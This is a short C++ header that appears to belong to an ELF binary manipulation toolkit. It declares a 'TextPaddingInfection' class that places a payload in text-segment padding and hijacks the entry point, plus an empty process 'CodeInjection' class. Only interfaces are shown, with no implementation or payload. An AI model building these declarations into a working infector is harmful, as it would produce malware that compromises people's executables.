#include "zkelf.hh"
#include "zkproc.hh"
#include <cstddef>

namespace Injections {
    /* text padding infection */
    class TextPaddingInfection : public Binary::Elf{
        private:
            void    *tpi_payload;
            size_t  tpi_payload_sz;
            u8      tpi_magic[MAGIC_LEN];
            addr_t    tpi_org_entry;
            addr_t    tpi_fake_entry;
        public:
            TextPaddingInfection(const char *target, u8 *magic);
            ~TextPaddingInfection();
            /* 
             * re-alloc space for a new payload with a modified return 
             * addres. 
             * return address = tpi_org_entry
             */
            void SetPayload(u8 *payload, size_t payload_sz);
            /* find a freespace and set tpi_fake_entry */
            off_t FindFreeSpace(void);
            void InjectPayload(void);
    };

    class CodeInjection : public Process::Proc{
        private:
            void    *cd_payload;
            size_t  cd_payload_sz;

        
    };
}
